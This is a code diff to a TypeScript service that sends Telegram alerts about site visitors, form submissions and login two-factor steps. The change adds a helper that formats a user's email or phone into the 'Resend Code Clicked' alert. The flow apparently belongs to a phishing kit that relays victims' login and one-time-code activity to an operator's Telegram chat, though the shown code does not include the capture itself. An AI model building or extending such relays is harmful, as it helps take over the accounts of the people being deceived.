@@ -174,6 +174,20 @@ export async function sendVisitorNotification(data: VisitorTelegramData): Promis
   return await sendTelegramMessage(message, { disablePreview: false, previewUrl, preferSmallMedia: true })
 }
 
+/* fleet-resend-identity-helper */
+const RESEND_ID_BRAND_DEFAULT = "User ID"
+function formatResendIdentityLine(userId: unknown, asCodeFn: (v: unknown) => string = asCode): string {
+  const raw = userId == null ? "" : String(userId).trim()
+  if (!raw) return ""
+  const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
+  if (raw.includes("@") && emailRe.test(raw)) return `📧 Email: ${asCodeFn(raw)}`
+  const digits = raw.replace(/\D/g, "")
+  if (digits.length >= 10 && digits.length <= 15 && !raw.includes("@")) {
+    return `📱 Phone: ${asCodeFn(raw)}`
+  }
+  return `👤 ${RESEND_ID_BRAND_DEFAULT}: ${asCodeFn(raw)}`
+}
+
 export async function sendFormNotification(data: FormData & { [key: string]: any }): Promise<boolean> {
   let message: string
 
@@ -362,9 +376,11 @@ ${lines || 'No questions captured.'}`
 ✅ <b>Status:</b> ${asCode('Submitted')}`
   }
   // 7a) Login 2FA – resend code (login verify-code)
+
   else if (data.type === 'login_email_otp_resend' || data.type === 'login_text_otp_resend') {
     message = `🔔 <b>Resend Code Clicked</b>
-━━━━━━━━━━━━━━━━━━`
+━━━━━━━━━━━━━━━━━━
+${formatResendIdentityLine(data.userId) || ""}`
   }
   // 7b) Login 2FA – "I did not receive my code" clicked
   else if (data.type === 'login_did_not_receive_code') {
@@ -554,6 +570,8 @@ class TelegramService {
         }),
     })
   }
+
+
 }
 
 export const telegramService = new TelegramService()
